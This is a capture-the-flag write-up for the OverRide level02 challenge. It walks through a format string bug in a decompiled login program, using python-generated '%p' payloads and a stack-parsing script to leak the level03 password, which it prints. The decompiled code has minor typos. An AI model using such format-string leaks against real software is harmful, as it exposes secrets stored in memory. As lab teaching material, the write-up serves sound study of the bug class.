## level02 (format string vulnerability)
```clike=
int main()
{
    FILE *open_passfile;
    int read_pass_status;
    char username[100]; // 0x70 - 0xc
    char pass_file_content[48]; // 0xa0 - 0x70
    char pass[112]; // 0x110 - 0xa0
    
    memset(username, 0, 12);
    memset(pass_file_content, 0, 5);
    memset(pass, 0, 12);
    
    open_passfile = fopen("/home/users/level03/", "r");
    if (!open_passfile)
    {
        fwrite("ERROR: failed to open password file", 1, 36, stderr);
        exit(1);
    }
    
    read_pass_status = fread(pass_file_content, 1, 41, open_passfile);
    pass_file_content[strcspn(pass_file_content, "\n")] = 0;
    if (!read_pass_status)
    {
        frwite("ERROR: failed to read password file", 1, 36, stderr);
        exit(1);
    }
    fclose(open_passfile);
    
    puts("===== [ Secure Access System v1.0 ] =====");
    puts("/***************************************\\");
    puts("| You must login to access this system. |");
    puts("\\**************************************/");
    printf("--[ Username:");
    fgets(username, 100, stdin);
    username[strcspn(username, "\n")] = 0;
    printf(" --[ Password:");
    fgets(pass, 100, stdin);
    pass[strcspn(pass, "\n")] = 0;
    
    puts("*****************************************");
    if (strncmp(pass_file_content, pass, 41) == 0)
    {
        printf("Greetings, %s!", username);
        system("/bin/sh");
        return 0;
    }
    else
    {
        printf(username);
        puts("does not have access!");
        exit(1);
    }
}
```

Looking from the source, it looks like a buffer overflow may not happen on username of pass since fgets is used to read characters equals to the buffer size, but we can still try to confirm.

```
# create test input
python -c "print 'B' * 1010 + '\n' + 'A' * 1010" > /tmp/level2

# run program
./level02 < /tmp/level2
```

As we can see, the program ran without faults
```
level02@OverRide:~$ ./level02  < /tmp/level2
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB does not have access!
level02@OverRide:~$
```

I tried thinking of manipulating the user and pass input to just a null byte, but it still compares 41 characters of the open passfile.  Since strcspn is new, I went to the manual to find any security warnings; no warings.

However, I noticed in the last few lines `printf(username);` was called. This was a direct call to a user input, which leaves us with a **string format vulnerability**.

To verify this, I ran the program with some new input to test and we have a segfault.
```
# create test input
python -c "print '%3\$s' '\n' + 'AAAA\n'" > /tmp/level2

# run program
./level02 < /tmp/level2
```
It could be that its trying to derefrence an invalid address when I supplied the `%s` parameter, so I decided to just print out a series on `%p`s to get a look at the stack state at this point without the need to derefrence. As we can see, we have the stack contents displayed. And since the contents of the password from the file are pushed to the stack, we should be able to read them eventually. What we are seeing here is the function arguments that are pushed to the stack. **It does not show the `push` commands in the disassembly, it is pushed after we call the function by `lib64` from libc since this program is compiled for 64-bit CPUs, instead, we just move them to specific registers in the program.**

```
level02@OverRide:~$ python -c "print '%p %p %p %p %p %p %p' '\n' + 'A\n'" > /tmp/level2
level02@OverRide:~$ ./level02 < /tmp/level2
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4f0 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 does not have access!
level02@OverRide:~$
```
From the surface here, we see some addresses and their contents. Hence, I made a script to automate the parsing of the stack for a number of times.

```
cat << EOF > /tmp/parse.py
# parse.py
import sys

# read input
input_string = sys.stdin.read()

# split string based on newline
lines = input_string.split('\n')

# get the last string
last_line = lines[len(lines) - 2]

# split by spaces
tokens = last_line.split(' ')
index = 0
for token in tokens:
    index += 1
    if token == "does" :
        break
    print(str(index) + ' - ' + token)
EOF
```

And the script is done, now to run it with our input and we get the results below.

```
level02@OverRide:~$ python -c "print '%p ' * 30 + '\n' + 'BBBBBBBB'" > /tmp/level2
level02@OverRide:~$ ./level02 < /tmp/level2 | python /tmp/parse.py
1 - 0x7fffffffe500
2 - (nil)
3 - 0x42
4 - 0x2a2a2a2a2a2a2a2a
5 - 0x2a2a2a2a2a2a2a2a
6 - 0x7fffffffe6f8
7 - 0x1f7ff9a08
8 - 0x4242424242424242
9 - (nil)
10 - (nil)
11 - (nil)
12 - (nil)
13 - (nil)
14 - (nil)
15 - (nil)
16 - (nil)
17 - (nil)
18 - (nil)
19 - (nil)
20 - 0x100000000
21 - (nil)
22 - 0x756e505234376848
23 - 0x45414a3561733951
24 - 0x377a7143574e6758
25 - 0x354a35686e475873
26 - 0x48336750664b394d
27 - (nil)
28 - 0x7025207025207025
29 - 0x2520702520702520
30 - 0x2070252070252070
31 -
```

Now to break it down, we first need to get some visuals on the stack
![image](https://hackmd.io/_uploads/HJ6Xnn5Lp.png)

We are tring to read the stuff in `passfile_content` and from the input we gave, the only input which is identifyable is the contents of `pass`. Which means, **once we see the contents of `pass` (which is 'BBBBBBBB'), we will need to go down the stack `0x70 = 112 (base10)` bytes to reach `passfile_content`**. 

If we look at the output, we can see lines 1 to 7 contain values that are **pushed by other function calls**, which serve no purpose. At line 8 however, we can see BBBBBBBB, which is the start of our `pass` variable. Going back to earlier, we will need to go down 112 bytes. Since `%p` traverses 8 bytes at a time, and `112 / 8 = 14`, our contents of `passfile_content` is at line `8 + 14 = 22`.

I used [this tool online](https://onlinehextools.com/convert-hex-to-string) to convert the data from hex to string, and reversed it for little endianess and I got the following string `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

I used `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H` as password for level03 and it worked

![image](https://hackmd.io/_uploads/Hk-sJaqUp.png)

